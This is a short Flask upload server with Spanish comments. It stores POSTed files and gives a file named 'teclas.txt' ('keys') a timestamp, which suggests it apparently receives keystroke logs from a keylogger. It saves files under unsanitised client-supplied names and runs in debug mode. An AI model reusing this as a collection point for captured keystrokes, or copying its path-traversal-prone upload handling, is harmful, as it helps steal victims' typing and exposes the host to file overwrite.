from flask import Flask, request
from datetime import datetime
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    # Verificar si la solicitud contiene un archivo
    if 'file' not in request.files:
        return '', 400

    file = request.files['file']
    print(request)
    # Verificar si el nombre del archivo está vacío
    if file.filename == '':
        return '', 400
    if file.filename == 'teclas.txt': 
        hora = datetime.now().strftime("%H-%M-%S-")
        file.save(hora+file.filename)
    else:
    # Guardar el archivo en el servidor
        file.save(file.filename)

    return '', 200

if __name__ == '__main__':
    app.run(debug=True)
